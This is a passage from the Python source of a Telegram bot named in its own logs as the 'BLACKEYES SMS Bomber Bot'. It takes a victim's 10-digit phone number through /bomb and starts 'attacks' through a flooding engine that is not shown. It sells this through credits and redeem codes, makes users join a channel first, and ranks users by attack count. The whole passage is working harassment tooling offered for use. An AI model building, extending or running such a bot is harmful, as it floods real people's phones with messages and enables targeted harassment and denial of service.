        f"🔒 **Protected Numbers**: `{len(load_protected())}`\n\n"
        f"Use the buttons below or commands to get started!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    # Check force join
    if not await check_force_join(user_id, context):
        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_JOIN_CHANNEL[1:]}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"⚠️ You must join our channel to use this bot!\n\n"
            f"📢 Channel: {FORCE_JOIN_CHANNEL}",
            reply_markup=reply_markup
        )
        return
    
    data = query.data
    
    if data == "bomb":
        await query.edit_message_text(
            "💣 **Start Bombing**\n\n"
            "Send a 10-digit phone number to start bombing.\n"
            "Example: `9876543210`",
            parse_mode='Markdown'
        )
        context.user_data['waiting_for_bomb'] = True
        
    elif data == "status":
        user = get_user(user_id)
        credits = user.get("credits", 0)
        
        # Get active attacks
        active_attacks = []
        for phone, active in engine.active.items():
            if active:
                status = engine.get_status(phone)
                if status:
                    active_attacks.append(f"📱 {phone}: {status['count']}/{status['max']} ({status['progress']:.1f}%)")
        
        status_text = f"📊 **Your Status**\n\n"
        status_text += f"💰 Credits: `{credits}`\n"
        status_text += f"📊 Total Attacks: `{user.get('total_attacks', 0)}`\n"
        status_text += f"📅 Joined: `{user.get('join_date', 'Unknown')}`\n\n"
        
        if active_attacks:
            status_text += "**Active Attacks:**\n" + "\n".join(active_attacks)
        else:
            status_text += "No active attacks running."
        
        await query.edit_message_text(status_text, parse_mode='Markdown')
        
    elif data == "redeem":
        await query.edit_message_text(
            "🎫 **Redeem Code**\n\n"
            "Send your 12-character redeem code to claim credits.\n"
            "Example: `ABCD1234EFGH`",
            parse_mode='Markdown'
        )
        context.user_data['waiting_for_redeem'] = True
        
    elif data == "protected":
        protected = load_protected()
        if protected:
            text = "📘 **Protected Numbers**\n\n"
            for phone, info in protected.items():
                text += f"📱 {phone} - {info.get('name', 'Unknown')}\n"
        else:
            text = "📘 No protected numbers found."
        await query.edit_message_text(text, parse_mode='Markdown')
        
    elif data == "help":
        help_text = (
            "ℹ️ **Help & Commands**\n\n"
            "**User Commands:**\n"
            "/start - Start the bot\n"
            "/help - Show this help\n"
            "/bomb <number> - Start bombing\n"
            "/stop <number> - Stop bombing\n"
            "/status - Your status\n"
            "/credits - Your credits\n"
            "/redeem <code> - Redeem code\n"
            "/protect <number> - Protect number\n"
            "/unprotect <number> - Remove protection\n"
            "/protected - Show protected numbers\n\n"
            "**Admin Commands:**\n"
            "/add <user_id> <amount> - Add credits\n"
            "/remove <user_id> <amount> - Remove credits\n"
            "/gen <quantity> <credits> - Generate codes\n"
            "/off - Turn off bot\n"
            "/on - Turn on bot\n"
            "/stats - Bot statistics\n"
            "/logs - Attack logs\n"
            "/broadcast - Send broadcast message\n"
            "/users - Show user count\n"
            "/addadmin <user_id> - Add admin\n"
            "/removeadmin <user_id> - Remove admin"
        )
        await query.edit_message_text(help_text, parse_mode='Markdown')

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check bot status
    if not is_bot_on() and user_id not in ADMIN_IDS:
        await update.message.reply_text("⚠️ Bot is currently OFF. Please try again later.")
        return
    
    # Check force join
    if not await check_force_join(user_id, context):
        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_JOIN_CHANNEL[1:]}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"⚠️ You must join our channel to use this bot!\n\n"
            f"📢 Channel: {FORCE_JOIN_CHANNEL}",
            reply_markup=reply_markup
        )
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "Usage: `/bomb <phone_number>`\n"
            "Example: `/bomb 9876543210`",
            parse_mode='Markdown'
        )
        return
    
    phone = args[0]
    success, message = engine.start_attack(phone, user_id)
    await update.message.reply_text(f"{'✅' if success else '❌'} {message}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/stop <phone_number>`", parse_mode='Markdown')
        return
    
    phone = args[0]
    success, message = engine.stop_attack(phone)
    await update.message.reply_text(f"{'✅' if success else '❌'} {message}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    credits = user.get("credits", 0)
    
    # Get active attacks
    active_attacks = []
    for phone, active in engine.active.items():
        if active:
            status = engine.get_status(phone)
            if status:
                active_attacks.append(f"📱 {phone}: {status['count']}/{status['max']} ({status['progress']:.1f}%)")
    
    status_text = f"📊 **Your Status**\n\n"
    status_text += f"💰 Credits: `{credits}`\n"
    status_text += f"📊 Total Attacks: `{user.get('total_attacks', 0)}`\n"
    status_text += f"📅 Joined: `{user.get('join_date', 'Unknown')}`\n\n"
    
    if active_attacks:
        status_text += "**Active Attacks:**\n" + "\n".join(active_attacks)
    else:
        status_text += "No active attacks running."
    
    await update.message.reply_text(status_text, parse_mode='Markdown')

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_user_credits(user_id)
    await update.message.reply_text(f"💰 Your Credits: `{credits}`", parse_mode='Markdown')

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check force join
    if not await check_force_join(user_id, context):
        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_JOIN_CHANNEL[1:]}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"⚠️ You must join our channel to use this bot!\n\n"
            f"📢 Channel: {FORCE_JOIN_CHANNEL}",
            reply_markup=reply_markup
        )
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "Usage: `/redeem <code>`\n"
            "Example: `/redeem ABCD1234EFGH`",
            parse_mode='Markdown'
        )
        return
    
    code = args[0].upper()
    success, message = redeem_code(code, user_id)
    await update.message.reply_text(message)

async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/protect <phone_number>`", parse_mode='Markdown')
        return
    
    phone = args[0]
    protect_number(phone)
    await update.message.reply_text(f"✅ Number `{phone}` protected successfully!", parse_mode='Markdown')

async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/unprotect <phone_number>`", parse_mode='Markdown')
        return
    
    phone = args[0]
    if remove_protected(phone):
        await update.message.reply_text(f"✅ Protection removed for `{phone}`!", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ Number `{phone}` not found!", parse_mode='Markdown')

async def protected_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    protected = load_protected()
    if protected:
        text = "📘 **Protected Numbers**\n\n"
        for phone, info in protected.items():
            text += f"📱 `{phone}` - {info.get('name', 'Unknown')}\n"
    else:
        text = "📘 No protected numbers found."
    await update.message.reply_text(text, parse_mode='Markdown')

# ==============================================
# 🔧 ADMIN COMMANDS
# ==============================================

async def add_credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: `/add <user_id> <amount>`", parse_mode='Markdown')
        return
    
    target_user = int(args[0])
    amount = int(args[1])
    new_credits = add_credits(target_user, amount)
    
    try:
        await context.bot.send_message(
            target_user,
            f"✅ Admin added `{amount}` credits to your account!\n💰 New balance: `{new_credits}`",
            parse_mode='Markdown'
        )
    except:
        pass
    
    await update.message.reply_text(f"✅ Added `{amount}` credits to user `{target_user}`\n💰 New balance: `{new_credits}`", parse_mode='Markdown')

async def remove_credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: `/remove <user_id> <amount>`", parse_mode='Markdown')
        return
    
    target_user = int(args[0])
    amount = int(args[1])
    
    success, remaining = deduct_credits(target_user, amount)
    if success:
        try:
            await context.bot.send_message(
                target_user,
                f"⚠️ Admin removed `{amount}` credits from your account!\n💰 New balance: `{remaining}`",
                parse_mode='Markdown'
            )
        except:
            pass
        await update.message.reply_text(f"✅ Removed `{amount}` credits from user `{target_user}`\n💰 New balance: `{remaining}`", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ User `{target_user}` doesn't have enough credits!", parse_mode='Markdown')

async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: `/gen <quantity> <credits_per_code>`\nExample: `/gen 5 100`", parse_mode='Markdown')
        return
    
    quantity = int(args[0])
    credits = int(args[1])
    
    codes = []
    for _ in range(quantity):
        code = generate_redeem_code(1, credits, user_id)
        codes.append(code)
    
    code_text = "\n".join([f"`{code}` - {credits} credits" for code in codes])
    await update.message.reply_text(
        f"✅ Generated `{quantity}` codes:\n\n{code_text}\n\n"
        f"📌 Each code gives `{credits}` credits",
        parse_mode='Markdown'
    )

async def off_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    set_bot_status(False)
    await update.message.reply_text("🔴 Bot is now OFF. Users cannot use the bot.")

async def on_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    set_bot_status(True)
    await update.message.reply_text("🟢 Bot is now ON. Users can use the bot.")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    user_data = load_user_data()
    total_users = len(user_data)
    total_attacks = sum(u.get("total_attacks", 0) for u in user_data.values())
    total_credits = sum(u.get("credits", 0) for u in user_data.values())
    
    # Get active attacks
    active_attacks = sum(1 for active in engine.active.values() if active)
    
    stats_text = f"📊 **Bot Statistics**\n\n"
    stats_text += f"👥 Total Users: `{total_users}`\n"
    stats_text += f"💣 Total Attacks: `{total_attacks}`\n"
    stats_text += f"💰 Total Credits: `{total_credits}`\n"
    stats_text += f"⚡ Active Attacks: `{active_attacks}`\n"
    stats_text += f"📡 APIs Loaded: `{len(ALL_APIS)}`\n"
    stats_text += f"🔒 Protected Numbers: `{len(load_protected())}`\n"
    stats_text += f"🔄 Bot Status: `{'ON' if is_bot_on() else 'OFF'}`"
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    if not os.path.exists(ATTACK_LOG):
        await update.message.reply_text("📋 No logs found.")
        return
    
    try:
        with open(ATTACK_LOG, "r") as f:
            lines = f.readlines()
            if not lines:
                await update.message.reply_text("📋 No logs found.")
                return
            # Send last 20 lines
            log_text = "📋 **Last 20 Attack Logs**\n\n" + "".join(lines[-20:])
            await update.message.reply_text(log_text, parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Error reading logs!")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/broadcast <message>`", parse_mode='Markdown')
        return
    
    message = " ".join(args)
    user_data = load_user_data()
    sent = 0
    failed = 0
    
    status_msg = await update.message.reply_text("📤 Sending broadcast message...")
    
    for uid in user_data.keys():
        try:
            await context.bot.send_message(int(uid), f"📢 **Broadcast Message**\n\n{message}", parse_mode='Markdown')
            sent += 1
            await asyncio.sleep(0.05)  # Avoid rate limit
        except:
            failed += 1
    
    await status_msg.edit_text(
        f"✅ Broadcast completed!\n"
        f"📤 Sent: `{sent}`\n"
        f"❌ Failed: `{failed}`",
        parse_mode='Markdown'
    )

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    user_data = load_user_data()
    total_users = len(user_data)
    
    # Get top users by attacks
    top_users = sorted(user_data.items(), key=lambda x: x[1].get("total_attacks", 0), reverse=True)[:5]
    
    text = f"👥 **Total Users**: `{total_users}`\n\n"
    text += "🏆 **Top 5 Users:**\n"
    for i, (uid, data) in enumerate(top_users, 1):
        text += f"{i}. `{uid}` - {data.get('total_attacks', 0)} attacks, {data.get('credits', 0)} credits\n"
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use this command!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/addadmin <user_id>`", parse_mode='Markdown')
        return
    
    new_admin = int(args[0])
    if new_admin not in ADMIN_IDS:
        ADMIN_IDS.append(new_admin)
        await update.message.reply_text(f"✅ User `{new_admin}` added as admin!", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"ℹ️ User `{new_admin}` is already an admin!", parse_mode='Markdown')

async def removeadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use this command!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/removeadmin <user_id>`", parse_mode='Markdown')
        return
    
    remove_admin = int(args[0])
    if remove_admin in ADMIN_IDS and remove_admin != OWNER_ID:
        ADMIN_IDS.remove(remove_admin)
        await update.message.reply_text(f"✅ User `{remove_admin}` removed from admins!", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ User `{remove_admin}` is not an admin or is the owner!", parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS
    
    help_text = (
        "ℹ️ **Help & Commands**\n\n"
        "**User Commands:**\n"
        "/start - Start the bot\n"
        "/help - Show this help\n"
        "/bomb <number> - Start bombing\n"
        "/stop <number> - Stop bombing\n"
        "/status - Your status\n"
        "/credits - Your credits\n"
        "/redeem <code> - Redeem code\n"
    )
    
    if is_admin:
        help_text += (
            "\n**Admin Commands:**\n"
            "/add <user_id> <amount> - Add credits\n"
            "/remove <user_id> <amount> - Remove credits\n"
            "/gen <quantity> <credits> - Generate codes\n"
            "/off - Turn off bot\n"
            "/on - Turn on bot\n"
            "/stats - Bot statistics\n"
            "/logs - Attack logs\n"
            "/broadcast <msg> - Broadcast message\n"
            "/users - Show user count\n"
            "/addadmin <user_id> - Add admin\n"
            "/removeadmin <user_id> - Remove admin"
        )
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

# ==============================================
# 💤 SELF-PING SYSTEM (8 minutes)
# ==============================================

async def self_ping(context: ContextTypes.DEFAULT_TYPE):
    """Send a ping to keep bot alive every 8 minutes"""
    try:
        await context.bot.get_me()
        logger.info("🔄 Self-ping successful")
    except Exception as e:
        logger.error(f"❌ Self-ping failed: {e}")

async def ping_loop(application):
    """Background task for self-ping"""
    while True:
        await asyncio.sleep(480)  # 8 minutes
        try:
            await application.bot.get_me()
            logger.info("🔄 Self-ping successful")
        except Exception as e:
            logger.error(f"❌ Self-ping failed: {e}")

# ==============================================
# 📨 MESSAGE HANDLER
# ==============================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    # Check bot status
    if not is_bot_on() and user_id not in ADMIN_IDS:
        await update.message.reply_text("⚠️ Bot is currently OFF. Please try again later.")
        return
    
    # Check force join
    if not await check_force_join(user_id, context):
        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_JOIN_CHANNEL[1:]}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"⚠️ You must join our channel to use this bot!\n\n"
            f"📢 Channel: {FORCE_JOIN_CHANNEL}",
            reply_markup=reply_markup
        )
        return
    
    # Check if waiting for bomb
    if context.user_data.get('waiting_for_bomb'):
        # Clean phone number
        phone = ''.join(filter(str.isdigit, text))
        if len(phone) == 10:
            success, message = engine.start_attack(phone, user_id)
            await update.message.reply_text(f"{'✅' if success else '❌'} {message}")
        else:
            await update.message.reply_text("❌ Invalid number! Please send a 10-digit phone number.")
        context.user_data['waiting_for_bomb'] = False
        return
    
    # Check if waiting for redeem
    if context.user_data.get('waiting_for_redeem'):
        code = text.strip().upper()
        if len(code) == 12:
            success, message = redeem_code(code, user_id)
            await update.message.reply_text(message)
        else:
            await update.message.reply_text("❌ Invalid code! Please send a 12-character code.")
        context.user_data['waiting_for_redeem'] = False
        return
    
    # Default response
    await update.message.reply_text(
        "❓ Unknown command. Use /help to see all available commands."
    )

# ==============================================
# 🚀 MAIN APPLICATION
# ==============================================

def main():
    """Main entry point for the bot"""
    try:
        # Create required files
        if not os.path.exists(PROTECTED_FILE):
            save_protected({})
        if not os.path.exists(CONFIG_FILE):
            save_config(DEFAULT_CONFIG)
        if not os.path.exists(USER_DATA_FILE):
            save_user_data({})
        if not os.path.exists(REDEEM_CODES_FILE):
            save_redeem_codes({})
        
        # Create application
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Register command handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("bomb", bomb_command))
        application.add_handler(CommandHandler("stop", stop_command))
        application.add_handler(CommandHandler("status", status_command))
        application.add_handler(CommandHandler("credits", credits_command))
        application.add_handler(CommandHandler("redeem", redeem_command))
        application.add_handler(CommandHandler("protect", protect_command))
        application.add_handler(CommandHandler("unprotect", unprotect_command))
        application.add_handler(CommandHandler("protected", protected_command))
        
        # Admin commands
        application.add_handler(CommandHandler("add", add_credits_command))
        application.add_handler(CommandHandler("remove", remove_credits_command))
        application.add_handler(CommandHandler("gen", gen_command))
        application.add_handler(CommandHandler("off", off_command))
        application.add_handler(CommandHandler("on", on_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("logs", logs_command))
        application.add_handler(CommandHandler("broadcast", broadcast_command))
        application.add_handler(CommandHandler("users", users_command))
        application.add_handler(CommandHandler("addadmin", addadmin_command))
        application.add_handler(CommandHandler("removeadmin", removeadmin_command))
        
        # Callback query handler for inline buttons
        application.add_handler(CallbackQueryHandler(button_handler))
        
        # Message handler
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        # Start self-ping task
        asyncio.create_task(ping_loop(application))
        
        # Start the bot
        logger.info("🐉 BLACKEYES SMS Bomber Bot started!")
        logger.info(f"📡 Bot Token: {BOT_TOKEN[:10]}...")
        logger.info(f"👑 Owner ID: {OWNER_ID}")
        logger.info(f"👥 Admin IDs: {ADMIN_IDS}")
        logger.info(f"📢 Force Join Channel: {FORCE_JOIN_CHANNEL}")
        logger.info(f"📡 APIs Loaded: {len(ALL_APIS)}")
        logger.info(f"🔄 Self-ping active every 8 minutes")
        
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        logger.error(f"❌ Fatal Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
